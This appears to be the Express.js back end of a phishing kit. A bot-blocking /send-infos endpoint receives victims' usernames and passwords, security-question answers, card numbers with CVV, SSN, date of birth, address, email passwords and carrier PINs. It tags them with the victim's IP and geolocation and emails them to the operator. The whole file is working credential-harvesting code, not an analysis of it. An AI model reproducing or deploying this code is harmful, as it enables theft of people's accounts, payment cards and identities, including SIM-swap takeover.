import express from "express";
import noBots from "express-nobots";
import geoip from "geoip-lite";

require("dotenv").config();

import { sendEmail } from "./utils/sendEmail";
import path from "path";

const app = express();

const port = process.env.PORT || 5000;

app.use(noBots());
app.use(express.json());

app.post("/send-infos", async (req, res) => {
  try {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);
    const values = req.body;
    await sendEmail(
      process.env.EMAIL_ADDRESS as string,
      `
     <div>*******************************************************************************************</div>
     <div>*******************************************************************************************</div>
     ${
       values.form === "LOGIN DETAILS"
         ? `
        <br>
        <h4>| LOGIN DETAILS</h4>
        <p>| USERNAME 👉🏽 <b>${values.loginDetails.username}</b></p>
        <p>| PASSWORD 👉🏽 <b>${values.loginDetails.password}</b></p>
        <br>
        `
         : `
     ${
       values.form === "SECURITY CHALLENGE"
         ? `
     <br>
     <h4>| SECURITY CHALLENGE</h4>
     <p>| QUESTION ONE 👉🏽 <b>${values.securityChallenge.challenQuestion1}</b></p>
     <p>| ANSWER ONE 👉🏽 <b>${values.securityChallenge.answer1}</b></p>
     <p>| QUESTION TWO 👉🏽 <b>${values.securityChallenge.challenQuestion2}</b></p>
     <p>| ANSWER TWO 👉🏽 <b>${values.securityChallenge.answer2}</b></p>
     <p>| QUESTION THREE 👉🏽 <b>${values.securityChallenge.challenQuestion3}</b></p>
     <p>| ANSWER THREE 👉🏽 <b>${values.securityChallenge.answer3}</b></p>
     <br>
     `
         : `${
             values.form === "CARD INFORMATION"
               ? `
      <br>
      <h4>| CARD INFORMATION</h4>
      <p>| FULL NAME 👉🏽 <b>${values.cardInformation.fullname}</b></p>
      <p>| CARD NUMBER 👉🏽 <b>${values.cardInformation.cardNumber}</b></p>
      <p>| EXPIRATION DATE 👉🏽 <b>${values.cardInformation.expiryDate}</b></B></p>
      <p>| CVV 👉🏽 <b>${values.cardInformation.cvv}</b></p>
      <p>| SSN 👉🏽 <b>${values.cardInformation.ssn}</b></p>
      <p>| DOB 👉🏽 <b>${values.cardInformation.dob}</b></p>
      <p>| ADDRESS 👉🏽 <b>${values.cardInformation.fullAddress}</b></p>
      <br>
     `
               : `
               <br><br>
               <h4>| ACCOUNT UPDATE</h4>
               <p>| EMAIL ADDRESS 👉🏽 <b>${values.accountUpdate.email}</b></p>
               <p>| EMAIL ADDRESS PASSWORD 👉🏽 <b>${values.accountUpdate.password}</b></p>
               <p>| PHONE NUMBER 👉🏽 <b>${values.accountUpdate.phoneNumber}</b></p>
               <p>| CARRIER PIN 👉🏽 <b>${values.accountUpdate.carrierPin}</b></p>
               <br><br>
               `
           }`
     }
     `
     }
     <div>*******************************************************************************************</div>
     <div>*******************************************************************************************</div>
     <br>
     <p>| IP 👉🏽 <b>${ip}</b></p>
     <p>| LOCATION 👉🏽 <b>${geo?.city}, ${geo?.country}</b></p>
     <p>| TIMEZONE 👉🏽 <b>${geo?.timezone}</b></p>
     <br>
     <div>*******************************************************************************************</div>
     <div>********************************************END********************************************</div>
     `
    );
    res.send(Promise.resolve());
  } catch (error) {
    console.log(error);
  }
});

app.use(express.static(path.join(__dirname, "../build")));
app.get("/*", (_, res) => {
  res.sendFile(path.join(__dirname, "../build", "index.html"));
});

app.listen(port, () => {
  console.log(`Listening on http://localhost:${port}`);
});
